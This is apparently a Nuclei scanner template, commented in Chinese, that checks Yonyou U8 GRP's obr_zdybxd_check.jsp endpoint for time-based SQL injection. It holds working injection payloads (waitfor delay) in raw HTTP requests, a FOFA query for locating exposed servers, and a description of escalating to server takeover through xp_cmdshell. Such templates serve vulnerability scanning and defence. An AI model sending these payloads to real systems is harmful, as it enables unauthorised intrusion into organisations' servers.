id: yongyouU8-GRP-obr_zdybxd_check_jsp-sql-time

info:
  name: 用友U8 GRP obr_zdybxd_check.jsp SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-GRP-U8"
    用友 U8 GRP obr_zdybxd_check.jsp 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s/vkUBNwIjlTpSGQWSLbCBSg
  tags: sql injection


http:
  - raw:
      - |
        GET /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36

      - |
        GET /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and
